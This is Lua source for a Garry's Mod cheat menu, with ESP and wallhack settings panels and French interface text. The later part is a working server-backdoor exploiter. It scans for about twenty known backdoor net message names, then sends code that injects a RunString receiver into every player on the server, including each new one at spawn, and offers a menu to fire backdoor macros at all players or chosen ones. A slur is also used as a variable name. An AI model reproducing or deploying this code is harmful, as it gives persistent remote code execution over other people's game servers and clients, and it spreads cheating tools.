local OptionsColorBlue3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorBlue3:SetPos( 92,20 )
OptionsColorBlue3:SetSize( 20, 20 )
OptionsColorBlue3:SetText( " " )
OptionsColorBlue3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(117, 121, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlue3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 91")
LocalPlayer():ConCommand("fiji_secondary_color_props 96")
LocalPlayer():ConCommand("fiji_third_color_props 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorSeaBlue3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorSeaBlue3:SetPos( 114,20 )
OptionsColorSeaBlue3:SetSize( 20, 20 )
OptionsColorSeaBlue3:SetText( " " )
OptionsColorSeaBlue3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 221, 210))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(81, 255, 246))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorSeaBlue3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 81")
LocalPlayer():ConCommand("fiji_secondary_color_props 255")
LocalPlayer():ConCommand("fiji_third_color_props 246")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPurple3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorPurple3:SetPos( 136,20 )
OptionsColorPurple3:SetSize( 20, 20 )
OptionsColorPurple3:SetText( " " )
OptionsColorPurple3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(144, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(191, 109, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPurple3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 147")
LocalPlayer():ConCommand("fiji_secondary_color_props 76")
LocalPlayer():ConCommand("fiji_third_color_props 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPink3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorPink3:SetPos( 158,20 )
OptionsColorPink3:SetSize( 20, 20 )
OptionsColorPink3:SetText( " " )
OptionsColorPink3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(250, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(252, 96, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPink3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 252")
LocalPlayer():ConCommand("fiji_secondary_color_props 96")
LocalPlayer():ConCommand("fiji_third_color_props 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorWhite3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorWhite3:SetPos( 180,20 )
OptionsColorWhite3:SetSize( 20, 20 )
OptionsColorWhite3:SetText( " " )
OptionsColorWhite3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(210, 210, 210))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 255, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorWhite3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 255")
LocalPlayer():ConCommand("fiji_secondary_color_props 255")
LocalPlayer():ConCommand("fiji_third_color_props 255")
surface.PlaySound( fiji_ptiycheathover )

end
end




local btnSolid = BD:CreateBtn( "SOLID", 103, 73, 65, 25, pContent )
function btnSolid:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_vision_type:GetInt() == 2 then RunConsoleCommand( "BD_hitman_type", 0 ) else RunConsoleCommand( "BD_hitman_type", 2 )  end end
function btnSolid:Think() if fiji_vision_type:GetInt() == 2 then self.activebtn = true  else self.activebtn = false end end

local btnActive = BD:CreateBtn( "Activé", 103, 43, 65, 25, pContent )
function btnActive:DoClick()  surface.PlaySound( fiji_ptiycheatclick ) if fiji_vision_enable:GetInt() == 1 then RunConsoleCommand( "BD_hitman_enable", 0 ) else RunConsoleCommand( "BD_hitman_enable", 1 ) end end
function btnActive:Think() if fiji_vision_enable:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnPropsActive = BD:CreateBtn( "Activé", 368, 232, 65, 25, pContent )
function btnPropsActive:DoClick()  surface.PlaySound( fiji_ptiycheatclick ) if fiji_vision_enable_props:GetInt() == 1 then RunConsoleCommand( "BD_hitman_enable_props", 0 ) else RunConsoleCommand( "BD_hitman_enable_props", 1 ) end end
function btnPropsActive:Think() if fiji_vision_enable_props:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnSquelette = BD:CreateBtn( "SQUELETTE", 33, 73, 65, 25, pContent )
function btnSquelette:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_vision_type:GetInt() == 1 then RunConsoleCommand( "BD_hitman_type", 0 ) else RunConsoleCommand( "BD_hitman_type", 1 )  end end
function btnSquelette:Think() if fiji_vision_type:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnGlow = BD:CreateBtn( "GLOW", 173, 73, 65, 25, pContent )
function btnGlow:DoClick() surface.PlaySound( fiji_ptiycheatclick ) if fiji_vision_type:GetInt() == 3 then RunConsoleCommand( "BD_hitman_type", 0 ) else RunConsoleCommand( "BD_hitman_type", 3 )  end end
function btnGlow:Think() if fiji_vision_type:GetInt() == 3 then self.activebtn = true else self.activebtn = false end end

local btnEntiterActive = BD:CreateBtn( "Activé", 335, 35, 65, 25, pContent )
function btnEntiterActive:DoClick()  surface.PlaySound( fiji_ptiycheatclick ) if fiji_vision_enable_ent:GetInt() == 1 then RunConsoleCommand( "BD_hitman_enable_ent", 0 ) else RunConsoleCommand( "BD_hitman_enable_ent", 1 ) end end
function btnEntiterActive:Think() if fiji_vision_enable_ent:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnEntitermenu = BD:CreateBtn( "Menu", 403, 35, 65, 25, pContent )
function btnEntitermenu:DoClick()  surface.PlaySound( fiji_ptiycheatclick ) LocalPlayer():ConCommand("fiji_espent") end

local btnEntiterhalo = BD:CreateBtn( "Glow", 335, 135, 65, 25, pContent )
function btnEntiterhalo:DoClick()  surface.PlaySound( fiji_ptiycheatclick ) if fiji_vision_enable_enthalo:GetInt() == 1 then RunConsoleCommand( "fiji_vision_enable_enthalo", 0 ) else RunConsoleCommand( "fiji_vision_enable_enthalo", 1 ) end end
function btnEntiterhalo:Think() if fiji_vision_enable_enthalo:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnEntiterhalo = BD:CreateBtn( "Texte", 403, 135, 65, 25, pContent )
function btnEntiterhalo:DoClick()  surface.PlaySound( fiji_ptiycheatclick ) if fiji_vision_enable_enttext:GetInt() == 1 then RunConsoleCommand( "fiji_vision_enable_enttext", 0 ) else RunConsoleCommand( "fiji_vision_enable_enttext", 1 ) end end
function btnEntiterhalo:Think() if fiji_vision_enable_enttext:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnWeapon = BD:CreateBtn( "ARMES", 33, 103, 65, 25, pContent )
function btnWeapon:DoClick()
surface.PlaySound( fiji_ptiycheatclick )
if fiji_vision_infos_weapons:GetInt() == 1 then
RunConsoleCommand( 'BD_hitman_infos_weapons', 0 )
else
RunConsoleCommand( 'BD_hitman_infos_weapons', 1 )
end
end
function btnWeapon:Think() if fiji_vision_infos_weapons:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnName = BD:CreateBtn( "NOM", 103, 103, 65, 25, pContent )
function btnName:DoClick()
surface.PlaySound( fiji_ptiycheatclick )
if fiji_vision_infos_name:GetInt() == 1 then
RunConsoleCommand( 'BD_hitman_infos_name', 0 )
else
RunConsoleCommand( 'BD_hitman_infos_name', 1 )
end
end
function btnName:Think() if fiji_vision_infos_name:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local btnHealth = BD:CreateBtn( "SANTÉ", 173, 103, 65, 25, pContent )
function btnHealth:DoClick()
surface.PlaySound( fiji_ptiycheatclick )
if fiji_vision_infos_health:GetInt() == 1 then
RunConsoleCommand( 'BD_hitman_infos_health', 0 )
else
RunConsoleCommand( 'BD_hitman_infos_health', 1 )
end
end
function btnHealth:Think() if fiji_vision_infos_health:GetInt() == 1 then self.activebtn = true else self.activebtn = false end end

local pP = vgui.Create( "DPanel", pContent )
pP:SetSize( 205, 50 )
pP:SetPos( 33, 133 )
function pP:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "DISTANCE ESP", "ptiycheat_home5", 10, h / 2, color_white, 0, 1 )
end

local pP2 = vgui.Create( "DPanel", pContent )
pP2:SetSize( 205, 50 )
pP2:SetPos( 33, 188 )
function pP2:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "DISTANCE INFOS", "ptiycheat_home5", 10, h / 2, color_white, 0, 1 )
end
local pP3 = vgui.Create( "DPanel", pContent )
pP3:SetSize( 205, 50 )
pP3:SetPos( 297, 64 )
function pP3:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "DISTANCE ENT", "ptiycheat_home5", 10, h / 2, color_white, 0, 1 )
end
local pP4 = vgui.Create( "DPanel", pContent )
pP4:SetSize( 205, 50 )
pP4:SetPos( 297, 261 )
function pP4:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "DISTANCE PROPS", "ptiycheat_home5", 10, h / 2, color_white, 0, 1 )
end
local TextEsp = vgui.Create( "DPanel", pContent )
TextEsp:SetSize(100,30)
TextEsp:SetPos(220,355)
TextEsp.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 255,110,110, 0 ) )
end

local pDistanceA = vgui.Create( "DNumSlider", pContent )
pDistanceA:SetPos( 68, 188 )
pDistanceA:SetSize( 180, 50 )
pDistanceA:SetText( "" )
pDistanceA:SetMin( 120 )
pDistanceA:SetMax( 2000 )
pDistanceA:SetDecimals( 0 )
pDistanceA:SetValue( fiji_vision_distance_infos:GetInt() or 200 )
pDistanceA.Scratch:SetVisible( false )
pDistanceA.TextArea:SetTextColor( color_white )
function pDistanceA.Slider:Paint(w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 21, w, h / 5) local parent = self:GetParent() local barw = w * ( (parent:GetValue() - parent:GetMin()) / parent:GetRange() )
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 21, barw, h / 5)

elseif fiji_style_menu:GetInt() == 1 then
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawRect(0, 21, barw, h / 5)

else
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt())
surface.DrawRect(0, 21, barw, h / 5)
end
end
function pDistanceA:SetHeight(tall)
self.Slider.Knob:SetHeight(tall / 2 + 4)
DSlider.SetHeight(self, tall)
pDistanceA.SetTall = pDistanceA.SetHeight
pDistanceA.Slider.Knob:SetTall(5)
end
function pDistanceA.Slider.Knob:Paint(w, h)
derma.SkinHook( "Paint", "Button", self, 0, 0 )
end
function pDistanceA:OnValueChanged( val )
RunConsoleCommand( 'BD_hitman_distance_infos', tonumber( self:GetValue() ) )
end


local pDistance = vgui.Create( "DNumSlider", pContent )
pDistance:SetPos( 68, 133 )
pDistance:SetSize( 180, 50 )
pDistance:SetText( "" )
pDistance:SetMin( 120 )
pDistance:SetMax( 10000 )
pDistance:SetDecimals( 0 )
pDistance:SetValue( fiji_vision_distance:GetInt() or 200 )
pDistance.Scratch:SetVisible( false )
pDistance.TextArea:SetTextColor( color_white )
function pDistance:OnValueChanged( val )
RunConsoleCommand( 'BD_hitman_distance', tonumber( self:GetValue() ) )
end
function pDistance.Slider:Paint(w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 21, w, h / 5) local parent = self:GetParent() local barw = w * ( (parent:GetValue() - parent:GetMin()) / parent:GetRange() )
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 21, barw, h / 5)

elseif fiji_style_menu:GetInt() == 1 then
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawRect(0, 21, barw, h / 5)

else
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt())
surface.DrawRect(0, 21, barw, h / 5)
end
end
function pDistance:SetHeight(tall)
self.Slider.Knob:SetHeight(tall / 2 + 4)
DSlider.SetHeight(self, tall)
pDistance.SetTall = pDistance.SetHeight
pDistance.Slider.Knob:SetTall(5)
end
function pDistance.Slider.Knob:Paint(w, h)
derma.SkinHook( "Paint", "Button", self, 0, 0 )
end


local pDistanceB = vgui.Create( "DNumSlider", pContent )
pDistanceB:SetPos( 330, 64 )
pDistanceB:SetSize( 180, 50 )
pDistanceB:SetText( "" )
pDistanceB:SetMin( 200 )
pDistanceB:SetMax( 20000 )
pDistanceB:SetDecimals( 0 )
pDistanceB:SetValue( fiji_vision_distance_ent:GetInt() or 200 )
pDistanceB.Scratch:SetVisible( false )
pDistanceB.TextArea:SetTextColor( color_white )
function pDistanceB:OnValueChanged( val )
RunConsoleCommand( 'BD_hitman_distance_ent', tonumber( self:GetValue() ) )
end
function pDistanceB.Slider:Paint(w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 21, w, h / 5) local parent = self:GetParent() local barw = w * ( (parent:GetValue() - parent:GetMin()) / parent:GetRange() )
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 21, barw, h / 5)

elseif fiji_style_menu:GetInt() == 1 then
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawRect(0, 21, barw, h / 5)

else
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt())
surface.DrawRect(0, 21, barw, h / 5)
end
end
function pDistanceB:SetHeight(tall)
self.Slider.Knob:SetHeight(tall / 2 + 4)
DSlider.SetHeight(self, tall)
pDistanceB.SetTall = pDistanceB.SetHeight
pDistanceB.Slider.Knob:SetTall(5)
end
function pDistanceB.Slider.Knob:Paint(w, h)
derma.SkinHook( "Paint", "Button", self, 0, 0 )
end

local pDistanceC = vgui.Create( "DNumSlider", pContent )
pDistanceC:SetPos( 330, 261 )
pDistanceC:SetSize( 180, 50 )
pDistanceC:SetText( "" )
pDistanceC:SetMin( 200 )
pDistanceC:SetMax( 15000 )
pDistanceC:SetDecimals( 0 )
pDistanceC:SetValue( fiji_vision_distance_props:GetInt() or 200 )
pDistanceC.Scratch:SetVisible( false )
pDistanceC.TextArea:SetTextColor( color_white )
function pDistanceC:OnValueChanged( val )
RunConsoleCommand( 'BD_hitman_distance_props', tonumber( self:GetValue() ) )
end
function pDistanceC.Slider:Paint(w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 21, w, h / 5) local parent = self:GetParent() local barw = w * ( (parent:GetValue() - parent:GetMin()) / parent:GetRange() )
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 21, barw, h / 5)

elseif fiji_style_menu:GetInt() == 1 then
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawRect(0, 21, barw, h / 5)

else
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt())
surface.DrawRect(0, 21, barw, h / 5)
end
end
function pDistanceC:SetHeight(tall)
self.Slider.Knob:SetHeight(tall / 2 + 4)
DSlider.SetHeight(self, tall)
pDistanceC.SetTall = pDistanceC.SetHeight
pDistanceC.Slider.Knob:SetTall(5)
end
function pDistanceC.Slider.Knob:Paint(w, h)
derma.SkinHook( "Paint", "Button", self, 0, 0 )
end
end





concommand.Add("fiji_bckdrs", function()

local bdactiv = "";

function bdactiv( str )
local status, error = pcall( net.Start, str )
return status
end

if( bdactiv("Ulx_Error_88") ) then
bdactivname = "Ulx_Error_88"
else
end
if( bdactiv("FAdmin_Notification_Receiver") ) then
bdactivname = "FAdmin_Notification_Receiver"
else
end
if( bdactiv("DarkRP_ReceiveData") ) then
bdactivname = "DarkRP_ReceiveData"
else
end
if( bdactiv("fijiconn") ) then
bdactivname = "fijiconn"
else
end
if( bdactiv("Weapon_88") ) then
bdactivname = "Weapon_88"
else
end
if( bdactiv("nostrip") ) then
bdactivname = "nostrip"
else
end
if( bdactiv("SessionBackdoor") ) then
bdactivname = "SessionBackdoor"
else
end
if( bdactiv("DarkRP_AdminWeapons") ) then
bdactivname = "DarkRP_AdminWeapons"
else
end
if( bdactiv("_CAC_ReadMemory") ) then
bdactivname = "_CAC_ReadMemory"
else
end
if( bdactiv("thefrenchenculer") ) then
bdactivname = "thefrenchenculer"
else
end
if( bdactiv("Fix_Keypads") ) then
bdactivname = "Fix_Keypads"
else
end
if( bdactiv("Remove_Exploiters") ) then
bdactivname = "Remove_Exploiters"
else
end
if( bdactiv("MoonMan") ) then
bdactivname = "MoonMan"
else
end
if( bdactiv("disablebackdoor") ) then
bdactivname = "disablebackdoor"
else
end
if( bdactiv("Sbox_itemstore") ) then
bdactivname = "Sbox_itemstore"
else
end
if( bdactiv("Sbox_darkrp") ) then
bdactivname = "Sbox_darkrp"
else
end
if( bdactiv("R8") ) then
bdactivname = "R8"
else
end
if( bdactiv("c") ) then
bdactivname = "c"
else
end
if( bdactiv("_cac_") ) then
bdactivname = "_cac_"
else
end
if( bdactiv("_Defqon") ) then
bdactivname = "_Defqon"
else
end
if( bdactiv("noclipcloakaesp_chat_text") ) then
bdactivname = "noclipcloakaesp_chat_text"
else
end
if( bdactiv("Sandbox_ArmDupe") ) then
bdactivname = "Sandbox_ArmDupe"
else
end



local it = 50
if not snte then

function BD.Fire( code )

local cbd = BD.CurrentBackdoor

if !BD.Backdoors[cbd] then



return

end

local key = BD.BackdoorTypes[cbd].Netkey



bdnet().Start( key )

bdnet().WriteString( code )

bdnet().SendToServer()

end

BD.Backdoors = BD.PingBackDoors()
if !BD.IsMessagePooled( "ptiycheatsaver" ) and BD.BackdoorActive() then
BD.Fire( [[util.AddNetworkString( "ptiycheatsaver" )
function BDSendLua( p, str ) net.Start( "ptiycheatsaver" ) net.WriteString( str ) net.Send( p ) end
function BDSendLuaAll( str ) net.Start( "ptiycheatsaver" ) net.WriteString( str ) net.Broadcast() end
function BDInjectAids( p ) p:SendLua( 'net.Receive( "ptiycheatsaver", function() RunString( net.ReadString() ) end )' ) end
for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end
hook.Add( "PlayerInitialSpawn", "ptiycheatforever", function( p ) BDInjectAids( p ) end)
]] )
end

local BackdoorsMenu = vgui.Create( "DFrame" )
BackdoorsMenu:SetSize( 700, 400 )
BackdoorsMenu:Center()
BackdoorsMenu:SetTitle("")
BackdoorsMenu:SetDraggable(true)
BackdoorsMenu:ShowCloseButton( false )
BackdoorsMenu:MakePopup()
function BackdoorsMenu:Paint( w, h )


DrawBlur(self, 25)
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0,245 ) )
if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 4, 4, w - 8, 2,Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)))
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 4, 4, w - 8, 2, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
else
draw.RoundedBox( 0, 4, 4, w - 8, 2, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 4, h - 6, w - 10, 2, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 4, 6, 2, h - 12, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, w - 6, 6, 2, h - 10, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end
end

concommand.Add( "fiji_clearbd", function() -- fiji_sv_existmen
BackdoorsMenu:Remove()

end)

local TextBackdoor = vgui.Create( "DPanel", BackdoorsMenu )
TextBackdoor:SetSize(700,400)
TextBackdoor:SetPos(0,0)
TextBackdoor.Paint = function( self, w, h )
--draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 0, 0,255 ) )
draw.SimpleText("♦ Commandes générales", "DermaDefault", 65, 15, Color(255, 255, 255,100), 0, 1)
draw.SimpleText("♦ Commandes par joueurs", "DermaDefault", 65, 120, Color(255, 255, 255,100), 0, 1)
draw.SimpleText("Paramétrage commandes :", "DermaDefault", 475, 320, Color(255, 255, 255,100), 0, 1)

end

local CloseBackdoors = vgui.Create( "DButton", BackdoorsMenu)
CloseBackdoors:SetPos( 670, 8)
CloseBackdoors:SetSize( 20, 15 )
CloseBackdoors:SetTextColor( Color( 255, 255, 255, 255 ) )
CloseBackdoors:SetText( "X" )
CloseBackdoors.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 100))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 50))
end
CloseBackdoors.DoClick = function()
LocalPlayer():ConCommand("fiji_sv_existmen 0")
BackdoorsMenu:Remove()
end
end

local ReturnBackdoors = vgui.Create( "DButton", BackdoorsMenu)
ReturnBackdoors:SetPos( 638, 8)
ReturnBackdoors:SetSize( 30, 15)
ReturnBackdoors:SetTextColor( Color( 255, 255, 255, 255 ) )
ReturnBackdoors:SetText( "<--" )
ReturnBackdoors.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 100))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(100, 100, 100, 50))
end
ReturnBackdoors.DoClick = function()
LocalPlayer():ConCommand("ptiycheat")
BackdoorsMenu:Remove()
end
end

local wedungoofd = vgui.Create( "DLabel", BackdoorsMenu )
wedungoofd:SetPos( 13, 0 )
wedungoofd:SetFont( "Trebuchet18" )
wedungoofd:SetColor( Color( 120, 50, 50 ) )
wedungoofd:SetText( "" )
wedungoofd:SizeToContents()
for bd, t in pairs( BD.BackdoorTypes ) do
---------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------
local faggot = vgui.Create("DButton", BackdoorsMenu)
faggot:SetSize( 50, 14 )
faggot:SetPos( 10, 1+it-it/1.18 )
faggot:SetText( bd )
faggot.Paint = function(panel, w, h)

if BD.Backdoors[bd] then
faggot:SetTextColor(Color(255, 255, 255, 255))
draw.RoundedBox( 0, 0, 0, w, h, Color( 50, 50, 50, 230 ) )
draw.RoundedBox( 20, 0, 0, 2, h, Color( 100, 100, 100, 120 ) )
draw.RoundedBox( 2, 0, 0, w, 2, Color( 100, 100, 100, 120 ) )
draw.RoundedBox( 2, w - 2, 0, 2, h, Color( 100, 100, 100, 120 ) )
draw.RoundedBox( 2, 0, h - 2, w, 2, Color( 100, 100, 100, 120 ) )
else
faggot:SetTextColor(Color(255, 255, 255, 50))
draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 120 ) )
end
end
faggot.DoClick = function()
if BD.Backdoors[bd] then
NOTIFICATION("Vous utilisez désormais la backdoor "..bd)
BD.CurrentBackdoor = bd
surface.PlaySound( "buttons/combine_button1.wav" )
else
NOTIFICATIONNO("Backdoor non présente")
end
end
it = it + 105
end

local PlistAll = vgui.Create( "DPanelList", BackdoorsMenu )
PlistAll:SetPos( 62, 25 )
PlistAll:SetSize( 630, 200 )
PlistAll:SetPadding( 0 )
PlistAll:SetSpacing( 2 )
PlistAll:EnableHorizontal( true )
PlistAll:EnableVerticalScrollbar( true )
PlistAll:SetName( "" )
PlistAll.Paint = function( self, w, h )
--draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 0, 0,255 ) )


end
local PlistAllOnePlayer = vgui.Create( "DPanelList", BackdoorsMenu )
PlistAllOnePlayer:SetPos( 62, 130 )
PlistAllOnePlayer:SetSize( 630, 166 )
PlistAllOnePlayer:SetPadding( 0 )
PlistAllOnePlayer:SetSpacing( 2 )
PlistAllOnePlayer:EnableHorizontal( true )
PlistAllOnePlayer:EnableVerticalScrollbar( true )
PlistAllOnePlayer:SetName( "" )
PlistAllOnePlayer.Paint = function( self, w, h )
--draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 0, 0,255 ) )

end
local PlistAllPlayer = vgui.Create( "DPanelList", BackdoorsMenu )
PlistAllPlayer:SetPos( 62, 250 )
PlistAllPlayer:SetSize( 314, 115 )
PlistAllPlayer:SetPadding( 0 )
PlistAllPlayer:SetSpacing( 1 )
PlistAllPlayer:EnableHorizontal( false )
PlistAllPlayer:EnableVerticalScrollbar( true )
PlistAllPlayer:SetName( "" )
PlistAllPlayer.Paint = function( self, w, h )
--draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 0, 0,255 ) )
surface.SetDrawColor(0, 0, 0 ,0)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(1, 1, w-2, h-2)
surface.DrawOutlinedRect(2, 2, w-4, h-4)
surface.SetDrawColor(0, 0, 0 ,100)
surface.DrawRect(0, 0, w, h)
end
local faggot = vgui.Create("DButton", BackdoorsMenu)
faggot:SetSize( 311, 30 )
faggot:SetPos( 380, 361 )
faggot:SetText("Lancer/Stopper")
faggot:SetTextColor(Color(255, 255, 255, 255))
faggot.Paint = function(panel, w, h)
if faggot:IsHovered() then
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(50, 50, 50 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawOutlinedRect(0, 0, w, h)

elseif fiji_style_menu:GetInt() == 3 then
surface.SetDrawColor(50, 50, 50 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(255, 91, 91)
surface.DrawOutlinedRect(0, 0, w, h)

elseif fiji_style_menu:GetInt() == 1 then

surface.SetDrawColor(50, 50, 50 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawOutlinedRect(0, 0, w, h)

else
surface.SetDrawColor(50, 50, 50 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255)
surface.DrawOutlinedRect(0, 0, w, h)

end end
surface.SetDrawColor(150, 150, 150 ,50)
surface.DrawOutlinedRect(0, 0, w, h)
end
faggot.DoClick = function()
if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then NOTIFICATIONNO("Veuillez séléctionner une commande") return end
if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end
local cbd = BD.CurrentBackdoor if !BD.Backdoors[cbd] then NOTIFICATIONNO( "Veuillez séléctionner une backdoor présente") return end
end

local commandpersotext = vgui.Create( "DTextEntry", BackdoorsMenu ) -- create the form as a child of frame
commandpersotext:SetPos( 380, 282 )
commandpersotext:SetSize( 103, 30 )
commandpersotext:SetMultiline( true )
commandpersotext:SetText( "" )
